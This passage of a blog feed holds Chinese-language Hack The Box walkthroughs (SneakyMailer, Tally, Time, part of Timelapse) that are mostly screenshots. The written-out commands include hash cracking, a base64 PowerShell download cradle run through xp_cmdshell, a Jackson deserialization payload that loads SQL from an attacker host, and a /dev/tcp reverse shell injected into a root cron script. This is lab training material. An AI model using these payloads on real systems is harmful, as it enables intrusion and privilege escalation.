                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3ybzgj985180.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.500x0z9jdt40.webp"
                     
                ></p>
<p>通过爆破密钥获得的账号密码进行登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.2brrsr54it5w.webp"
                     
                ></p>
<p>搜一下有无可用exp</p>
<p><code>https://hg8.sh/posts/sneakymailer/#Cracking-PyPi-server-htpasswd</code></p>
<p>可以通过python进行写入一个密钥文件，达到登录其他用户</p>
<p>先创建一个.pypirc文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.2mzyt4swxke0.webp"
                     
                ></p>
<p>然后生成一个密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.1z33gla8mzs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.437916d9rne0.webp"
                     
                ></p>
<p>将密钥修改为本地生成的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.1inmf88y2x6o.webp"
                     
                ></p>
<p>上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.tma78smuccg.webp"
                     
                ></p>
<p>添加环境变量</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.1f9x62mvtry8.webp"
                     
                ></p>
<p>执行setup.py</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6zk57wksphw0.webp"
                     
                ></p>
<p>尝试用密钥登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.38qd10v8jgg0.webp"
                     
                ></p>
<p>发现sudo权限命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3llty8cl5mq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6sdktr49tjg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6htswhq9plg0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Tally - HackTheBox</title>
    <url>/post/c974e9a72087/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.7j082douv200.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.65qsedy599s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3lj9se0zwt80.webp"
                     
                ></p>
<p>先看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.7f9btkkqdv00.webp"
                     
                ></p>
<p>右上角有个登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.17lc3et7w8qo.webp"
                     
                ></p>
<p>猜不出密码</p>
<p>扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.4hmcpo1ph0q0.webp"
                     
                ></p>
<p>没有扫到可利用信息，而且访问这些asp文件都是同一个错误界面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.1iczlf4kme3k.webp"
                     
                ></p>
<p>扫描的结果告知了cms是Microsoft sharepoint</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.137ee0jcfe3k.webp"
                     
                ></p>
<p>DNS解析域名为tally，添加hosts文件</p>
<p>搜一下</p>
<p><code>https://sharepointstuff.com/2021/03/30/useful-sharepoint-urls/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.355yqflh4l00.webp"
                     
                ></p>
<p>这里有一大堆url路径，尝试访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3z9k7bnqbww0.webp"
                     
                ></p>
<p>在这个路径下发现了东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.44c7mo0jix40.webp"
                     
                ></p>
<p>在Documents下发现一个文件，看名字应该是ftp有关的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.2626gflbxe1s.webp"
                     
                ></p>
<p>ftp的密码，还差个用户名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3214i49xkbq0.webp"
                     
                ></p>
<p>在Site Pages下发现一个url文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.4j4wh8wux8q0.webp"
                     
                ></p>
<p>给出了ftp的用户名</p>
<p><code>wget -m ftp://ftp_user:&#39;UTDRSCH53c&quot;$6hys&#39;@10.10.10.59</code></p>
<p>把所有ftp上的文件都下载下来</p>
<p><code>kpcli --kdb tim.kdbx</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.9f83t48x8i8.webp"
                     
                ></p>
<p>需要密码，爆破一下</p>
<p><code>keepass2john tim.kdbx &gt; hash</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.1f3puonrq02o.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.4v2i0u7lpjw0.webp"
                     
                ></p>
<p>到hashcat看一下类型</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.39hftlgff5w0.webp"
                     
                ></p>
<p><code>hashcat -m 13400 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.7iowfazf0as0.webp"
                     
                ></p>
<p>要把前面的tim:去掉</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.148wx6dh5qgw.webp"
                     
                ></p>
<p>打开后发现一个Shares的表</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.5a32g619pxg0.webp"
                     
                ></p>
<p>应该是445端口的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.5o7muggy8nk0.webp"
                     
                ></p>
<p><code>smbclient //10.10.10.59/ACCT -U Finance%Acc0unting</code></p>
<p>在目录下发现一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3fah88td2kg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.2vlqg5b9ljo0.webp"
                     
                ></p>
<p>里面是数据库的账号密码</p>
<p>尝试连接一下</p>
<p><code>sqsh -S 10.10.10.59 -U sa</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.5gdqcw1ixsg0.webp"
                     
                ></p>
<p>密码不对</p>
<p>​	<img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.2khruyxax6k0.webp"
                     
                ></p>
<p>在该目录下发现一个压缩包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6axh5ppcljg0.webp"
                     
                ></p>
<p>继续爆破</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.191pvl2llidc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.77j2hjstzvg0.webp"
                     
                ></p>
<p>还是一样，把前面：的都删了</p>
<p><code>hashcat -m 17220 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.7dm5gcow0sk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6xqdcuyyzq00.webp"
                     
                ></p>
<p>有一个账号密码admin:Finance2</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.2qgbrqqdsv00.webp"
                     
                ></p>
<p>在该目录下发现一个tester.exe，下载下来看看是什么</p>
<p>用strings查看exe文件</p>
<p><code>strings tester.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.58cn3u8rono0.webp"
                     
                ></p>
<p>翻到一半发现了数据库配置信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.d64cm8dfhgg.webp"
                     
                ></p>
<p>连接数据库</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6a0vv0p29y40.webp"
                     
                ></p>
<p>既然是sql server数据库，就尝试用shell_exec提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.2j7arcuxq1k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.39syjw1axvk0.webp"
                     
                ></p>
<p>成功开启</p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3ssecdu5ulk0.webp"
                     
                ></p>
<p>这边找到了FTP的目录，可以通过FTP上传一个反弹shell，然后在这执行，找到一个可读写目录上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.5odu5uh457o0.webp"
                     
                ></p>
<p><code>echo &#39;iex(new-object system.net.webclient).downloadstring(&quot;http://10.10.14.12/test.ps1&quot;)&#39;|iconv -t utf-16le|base64 -w0</code></p>
<p><code>xp_cmdshell &#39;powershell -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAyAC8AdABlAHMAdAAuAHAAcwAxACIAKQAKAA==&#39;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.7fkujv5lxfw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.3ftdt8n05wg0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6ulc1brztn40.webp"
                     
                ></p>
<p>windows2016 64位</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6mr4wxjf3hg0.webp"
                     
                ></p>
<p>打了两个补丁</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.1rqx0pgwj4n4.webp"
                     
                ></p>
<p>权限足够，使用打印机欺骗</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.6c81sxpfn480.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.43etz3iisnk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tally/image.76rzoz8oxmw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Time - HackTheBox</title>
    <url>/post/c94f0488a0bb/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.759cdsesknw0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2r5qaycb3n20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.221tx4jcv39c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4dkmjtvp40s0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3nbkhal39xo0.webp"
                     
                ></p>
<p>可以选择两个模式</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5q0866u703w0.webp"
                     
                ></p>
<p>输入数字的话就会输出同样的数字</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.37h2gq1hqw80.webp"
                     
                ></p>
<p>输入英文就会输出null</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gtpt37i3w20.webp"
                     
                ></p>
<p>第二个模式直接报错了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.75qrsn6ojdo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4cyuwh9x1zo.webp"
                     
                ></p>
<p>报错爆出了java的包信息，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6sowgttqfg00.webp"
                     
                ></p>
<p>有个exp，貌似是个Jackson的反序列化</p>
<p><code>https://github.com/jas502n/CVE-2019-12384</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3go07qvx9pc0.webp"
                     
                ></p>
<p>将项目clone下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://localhost:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>

<p>使用这个语句调用exp，先在本地试验一下，用python开启一个http服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7dxyth1vvsg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3j2k0d5275a0.webp"
                     
                ></p>
<p>会请求本地的inject.sql文件，之后便会执行文件内容</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7cuz466021c0.webp"
                     
                ></p>
<p>在本地生成了一个txt文件，内部包含执行结果，修改inject.sql文件，反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.63v1n5jwkus0.webp"
                     
                ></p>
<p>在80端口的输入框中执行语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jruby test.rb &quot;[\&quot;ch.qos.logback.core.db.DriverManagerConnectionSource\&quot;, &#123;\&quot;url\&quot;:\&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;\&quot;&#125;]&quot;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5w4zecnfruw0.webp"
                     
                ></p>
<p>第一个模式貌似不起作用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.4kmrfk6yohk0.webp"
                     
                ></p>
<p>换第二个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5kp7g1vg6fo0.webp"
                     
                ></p>
<p>第二个也不行，还是报错，修改一下exp语句，将jruby test.rb和\都去掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://10.10.14.4:8000/inject.sql&#x27;&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6t8lep53z1k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60ctbyuv6do0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.1xlflhuk85nk.webp"
                     
                ></p>
<p>发现一个当前用户所有的sh脚本文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.5p4bordxcjk0.webp"
                     
                ></p>
<p>这个脚本会将&#x2F;var&#x2F;www&#x2F;html目录下的所有文件进行压缩，并将压缩包移动到&#x2F;root目录下，感觉这像是一个定时执行的文件，用pspy64看一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.7hqc8f7rhug0.webp"
                     
                ></p>
<p>确实是定时执行，而且是root用户权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.60my61pdk2w.webp"
                     
                ></p>
<p>而且当前用户对这个脚本文件是有可读写权限的，加一个反弹shell进去</p>
<p><code>echo &quot;zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip &amp;&amp; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.4/7777 0&gt;&amp;1&#39;&quot; &gt; /usr/bin/timer_backup.sh</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.6dtr00ihv6k0.webp"
                     
                ></p>
<p>当该文件被执行时，会反弹个shell回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.b33aaj2yfz4.webp"
                     
                ></p>
<p>反弹是反弹回来了，但是这个会话貌似会在几秒钟以内自动断开，趁着这几秒写一个密钥进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.2m8oxcdcz9m0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.3gl1vgsf2ay0.webp"
                     
                ></p>
<p>用密钥登录root用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Time/image.61kq9qklefc0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Timelapse - HackTheBox</title>
    <url>/post/5ef055ee909e/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.6j5nmmx5lrw0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.4m82g7andcw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.43n3qa666ty0.webp"
                     
                ></p>
<p>先看88端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.5xci5omrebs0.webp"
                     
                ></p>
<p>389端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.6yr72r8in9k0.webp"
                     
                ></p>
<p>445端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.4x1e7kj6twc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.2sefllk8fye0.webp"
                     
                ></p>
<p>发现一个压缩文件，下载下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.ovg50ubymu8.webp"
                     
                ></p>
<p>爆破一下密码</p>
<p><code>zip2john winrm_backup.zip &gt;&gt; hash</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.6e8ipf0hnhw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.1bq0lj1531r4.webp"
                     
                ></p>
<p>.pfx文件是类似于一个linux中的ssh密钥文件，将其进行解密</p>
<p><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out test.key</code></p>
<p>用压缩包的密码不对</p>
<p>在爆破一下</p>
<p><code>pfx2john legacyy_dev_auth.pfx &gt; pfx</code></p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt pfx</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.1730s2lbb6io.webp"
                     
                ></p>
<p>执行后得到一个密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.1xd9dx4iua9s.webp"
                     
                ></p>
<p>但还需要一个</p>
<p><code>openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.49n8csyq01i0.webp"
                     
                ></p>
<p>利用evil-winrm进行连接</p>
<p><code>evil-winrm -i 10.10.11.152 -S -c cert -k test.key -p -u</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.25a0o5pqkkbk.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.6ylokmsdfls0.webp"
                     
                ></p>
<p>上传检测脚本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.57k354mb2n80.webp"
                     
                ></p>
<p>发现一个控制台历史文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.5zboz8s2cm40.webp"
                     
                ></p>
<p>得到了一个svc_deploy的用户密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Timelapse/image.jvnicnb7g68.webp"
                     
                ></p>
<p>该用户处于LAPS_Readers用户组</p>
